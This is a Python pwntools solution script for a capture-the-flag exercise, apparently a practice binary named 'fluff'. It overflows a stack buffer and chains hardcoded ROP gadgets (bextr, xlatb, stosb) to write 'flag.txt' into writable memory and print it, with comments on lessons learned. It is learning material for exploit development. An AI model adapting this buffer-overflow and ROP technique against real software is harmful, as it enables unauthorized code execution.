from pwn import *

# Solution
# Need to replace the "nonexistant" characters in the data section to "flag.txt"
# Could also call the print function with the data pointing to a new location
# Use gadgets that add/or one byte at an address, will have to use lots of gadgets tho

# Things learned
# If you see a new instruction make sure to learn what exactly it does, and if it has any weirdness to it
# Use multiple gadget discovery tools, ROPGadget was missing some that had returns tightly packed
#   - after further digging, it was because the 9 bytes was reached from the return, so the instructions I was interested in were higher than that
# When dealing with scratch spaces, and read/writing to other segments of mem, .data .bss, check the permissions
# For some reason I was tyring to write bytes to .rodata, which is read only (duh)
# Super important to be as effecient with gadgets as much as possible

# Functions
f_useful_function = p64(0x400617)
plt_print_function = p64(0x400510)

# Gadgets
g_stosb_byte_ptr_rdi_al = p64(0x400639) # stosb byte ptr [rdi], al ; ret
g_pop_rdi = p64(0x4006a3)
g_ret = p64(0x400295)

g_reset_eax_pop_rbp = p64(0x400610) # mov eax, 0 ; pop rbp ; ret

g_set_rbx_val = p64(0x40062a) # Will set an rbx val, prob needs to have a function wrapped around this
g_xlatb = p64(0x400628) # Sets al = rbx + al

# Data
s_scratch_space = p64(0x601028)
flag_txt = "flag.txt"

def set_rbx_val(rbx_val):
  '''
    pop rdx
    pop rcx
    add rcx, 0x3ef2
    bextr rbx, rcx, rdx
    ret
  '''

  add_val = 0x3ef2
  r_rcx = rbx_val - add_val # This gadget adds to rcx

  src = p64(r_rcx, sign="signed")
  src2 = p64(0xFFFFFFFFFFFFFF00) # This is the operand for START and LEN, the intent is to grab all bits from register
  
  payload = b''.join([
    g_set_rbx_val,
    src2, # pop rdx
    src # pop rcx
  ])
  
  return payload

def set_al_val(al_val, prev_al):
  '''
    xlat rbx
    ret
  '''
  
  # set eax to 0, so that al is 0, so the xlatb sets al = rbx + al
  payload = b''.join([
    g_xlatb
  ])

  return set_rbx_val(al_val - prev_al) + payload

def find_flag_chars():
  '''
  Looks in the segment that is mapped at x400000
    
  which is at at offsets 0x238 - 0x718 in the elf file
  '''
  with open('./fluff', 'rb') as f:
    data = f.read()

  data = data[:0x718] # These are the offsets in the elf file
  mem_offset = 0x400000 # Where the segment starts
  flag_txt = set(['f','l','a','g','.','t','x'])
  flag_mem_arr = dict()
  for i, b in enumerate(data):
    if chr(b) in flag_txt:
      flag_mem_arr[chr(b)] = i + mem_offset
      flag_txt.remove(chr(b))
      
      if len(flag_txt) == 0:
        break
  
  return(flag_mem_arr)

def replace_with_flag():
  scratch_address = u64(s_scratch_space)
  flag_mem = find_flag_chars()
  flag_txt = 'flag.txt'

  payload = b''
  prev_al = 0xb
  for c in flag_txt:
    payload += g_pop_rdi
    payload += p64(scratch_address)
    payload += set_al_val(flag_mem[c], prev_al)
    payload += g_stosb_byte_ptr_rdi_al

    scratch_address += 1
    prev_al = ord(c)

  return payload


def main():
  proc = process('fluff')
  context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
  gdb.attach(proc)
  sleep(5)

  buff = b'A' * 0x20
  rbp = b'A' * 8

  payload = b''.join([
    buff,
    rbp,
    replace_with_flag(),
    g_pop_rdi,
    s_scratch_space,
    plt_print_function
  ])

  # ROPChain needs to be < 0x200 (512) bytes
  print(len(payload))

  proc.sendlineafter(b'>', payload)
  log.info(proc.recvline_contains(b'ROPE'))

if __name__ == '__main__':
  main()
